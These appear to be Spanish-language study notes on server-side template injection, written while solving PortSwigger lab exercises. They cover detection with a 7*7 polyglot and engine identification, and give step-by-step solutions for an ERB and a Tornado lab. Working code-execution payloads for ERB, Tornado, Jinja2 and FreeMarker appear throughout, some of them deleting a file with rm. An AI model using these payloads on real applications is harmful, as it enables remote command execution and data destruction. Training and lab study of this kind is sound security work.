## ② Qué es SSTI

Las aplicaciones web muestran contenido **dinámico** que se genera en tiempo real. Para eso existen los **motores de plantillas**, que toman un formato fijo con variables y lo rellenan con datos reales.

### Ejemplo seguro vs vulnerable

| Tipo | Código | Resultado |
|---|---|---|
| **Seguro** | `render(template="hola {{nombre}}", nombre=entrada)` | Datos como parámetro separado |
| **Vulnerable** | `render(template="hola " + entrada)` | Entrada concatenada en el template |

> [!important] La metáfora
> Es como la diferencia entre darle a alguien **una receta con un ingrediente a rellenar** (seguro), y darle **la receta en blanco para que la escriba él entero** (vulnerable).

## ③ La señal de detección: el famoso 49

La detección de SSTI se reduce a inyectar `7*7` con la sintaxis del motor sospechado y observar si la respuesta muestra **49** en lugar del texto literal.

### Flujo de detección

```
1. Inyectar polyglot (mezcla de sintaxis de todos los motores)
2. Observar qué caracteres desaparecen del output
3. Identificar el motor por eliminación
4. Confirmar con 7*7 → 49
```

### El polyglot

```bash
# Payload genérico que mezcla todos los motores
${7*7} {{7*7}} <%=7*7%> #{7*7}
```

| Motor | Sintaxis | Si desaparecen... |
|---|---|---|
| **ERB (Ruby)** | `<%= 7*7 %>` | `<`, `%`, `=`, `>` |
| **Tornado/Jinja2 (Python)** | `{{ 7*7 }}` | `{{` y `}}` |
| **FreeMarker (Java)** | `${ 7*7 }` | `$`, `{`, `}` |
| **Twig (PHP)** | `{{ 7*7 }}` | Similar a Jinja2 |

> [!important] La idea clave
> El 49 no es el fin, es la **confirmación de que hay ejecución**. Lo que interesa es escalar de esa operación matemática a whoami, a leer ficheros, a borrar ficheros, o a abrir una reverse shell.

---

## ④ Motores principales y sus sintaxis

### ERB (Ruby)

```ruby
# Detección
<%=7*7%>

# RCE (ejecución de comandos)
<%=system("rm /home/carlos/morale.txt")%>
```

### Tornado (Python)

```python
# Detección
{{7*7}}

# RCE (requiere import)
}}{% import os %}{{os.system("rm /home/carlos/morale.txt")}}
```

### Jinja2 (Python)

```python
# Detección
{{7*7}}

# Acceso a clases
{{''.__class__.__mro__[1].__subclasses__()}}
```

### FreeMarker (Java)

```java
# Detección
${7*7}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("whoami")}
```

## ⑤ Laboratorio 1 — ERB Ruby: producto sin stock

### Escenario

Tienda de PortSwigger con productos con stock y sin stock. El parámetro `message` en la URL refleja directamente el contenido en la página.

### Resolución

```
1. Intruder → Iterar product ID del 1 al 20
2. Producto 1 → 302 con message en URL
3. Inyectar polyglot en message
4. Caracteres <%= %> desaparecen → ERB Ruby
5. Confirmar: <%=7*7%> → 49
6. RCE: <%=system("rm /home/carlos/morale.txt")%>
```

> [!important] Cuidado con el encoding
> El espacio entre `rm` y la ruta se codifica como `+` al URL-encodear el parámetro. Si no se codifica correctamente, el comando falla.

## ⑥ Laboratorio 2 — Tornado Python: escape de variable

### Escenario

Más complejo: la vulnerabilidad no está en un campo de texto libre sino en la variable `user.name` que se inyecta en el template del backend.

### El problema conceptual

El template por detrás hace: `{{ user.name }}`

Si el atacante solo cambia `user.name` por `{{ 7*7 }}`, el servidor recibe:
```
{{ {{ 7*7 }} }}
```
Esto es sintaxis inválida y puede petar.

### La solución: cerrar primero

```bash
# Incorrecto (sintaxis inválida)
{{ {{ 7*7 }} }}

# Correcto (cerrar el contexto primero)
}}{{7*7}}

# Resultado en backend
{{ }}{{7*7}}{{ ... }}
```

> [!important] El paralelismo con SQL Injection
> Igual que se cierra la consulta con una comilla antes de inyectar el payload, aquí se cierra el bloque de plantilla con `}}` antes de inyectar el propio.

### RCE en Tornado

```python
# Importar módulo os + ejecutar comando
}}{% import os %}{{os.system("rm /home/carlos/morale.txt")}}
```

- `{% import os %}` usa la sintaxis de **bloque** de Tornado
- `{{ os.system(...) }}` usa la sintaxis de **expresión**
- El output `Carlos 0` significa éxito (0 = código de retorno)

## ⑦ Las tres fases de SSTI

| Fase | Qué hacer | Herramienta |
|---|---|---|
| **1. Detectar** | Inyectar `7*7` → ¿sale 49? | Polyglot |
| **2. Identificar motor** | ¿Qué caracteres desaparecen? | Análisis de output |
| **3. Explotar** | Usar sintaxis específica del motor | HackTricks, PayloadsAllTheThings |
